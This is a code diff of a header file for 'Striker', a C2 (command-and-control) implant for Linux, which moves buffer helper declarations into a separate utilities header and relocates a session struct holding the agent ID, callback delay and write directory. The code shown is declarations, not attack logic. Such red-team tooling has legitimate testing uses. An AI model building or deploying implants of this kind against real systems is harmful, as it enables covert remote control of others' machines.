@@ -1,6 +1,8 @@
 /**
+ *--------------------------------------------------
  * Header file for the Striker C2 implant for linux.
- *             Author: Umar Abdul
+ *                                Author: Umar Abdul
+ *--------------------------------------------------
  */
 
 #ifndef STRIKER_H
@@ -11,6 +13,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <curl/curl.h>
+#include "striker_utils.h"
 #include "cJSON.h"
 
 // Set to non-zero value for debug outputs.
@@ -22,16 +25,17 @@ char baseURL[URL_SIZE] = "http://localhost:3000";
 #define MAX_RES_SIZE (sizeof(char) * 102400)
 
 /**
- * A struct for working with buffers.
- * `buffer` is the buffer (very helpful :)
- * `size` is total number of bytes allocated to it.
- * `used` is used to track number of bytes in use.
+ * A struct for tracking session info.
+ * `uid` is the agent ID.
+ * `delay` is the callback delay in seconds (default: 5)
+ * `write_dir` is a full path to a writable directory, which may be used when we have to write something.
+ *            Make sure it ends with a '/'.
  */
 typedef struct{
-  void *buffer;
-  size_t size;
-  size_t used;
-} buffer;
+  char *uid;
+  unsigned long delay;
+  char *write_dir;
+} session;
 
 /**
  * A struct for representing a single task.
@@ -48,46 +52,6 @@ typedef struct{
   unsigned short completed;
   cJSON *result;
 } task;
-
-/**
- * A struct for tracking session info.
- * `uid` is the agent ID.
- * `delay` is the callback delay in seconds (default: 5)
- * `write_dir` is a full path to a writable directory, which may be used when we have to write something.
- *            Make sure it ends with a '/'.
- */
-typedef struct{
-  char *uid;
-  unsigned long delay;
-  char *write_dir;
-} session;
-
-/**
- * Create a new buffer of `size` bytes, and initialize all it's bytes to null.
- * If `size` is zero, the call to malloc() will use 1 to still allocate some memory but buffer.size
- * and buffer.used will be kept at 0.
- */
-buffer *create_buffer(size_t size);
-
-// Resize a buffer. It DOES NOT change the `used` property unless the `new_size` is less than it.
-void resize_buffer(buffer *buff, size_t new_size);
-
-/**
- * Append a max of `len` bytes from `src` to `dest` buffer.
- * Note: resize_buffer() will be used to resize the dest buffer if not enough space is available.
- * Returns the number of bytes appended.
- */
-size_t append_buffer(buffer *dest, const void *src, size_t len);
-
-// Empty `dest` buffer and copy the contents of null-terminated `src` as it's new value.
-// It DOES NOT null-terminate the `dest` buffer.
-size_t buffer_strcpy(buffer *dest, const char *src);
-
-// Convert a buffer to a null-terminated string. Uses the `used` var to determine length.
-char *buffer_to_string(buffer *buff);
-
-// Free a buffer. Called when a buffer is no longer needed.
-void free_buffer(buffer *buff);
 
 /**
  * Initializes a new CURL object for a request to `path` relative to the base URL of the C2 server.
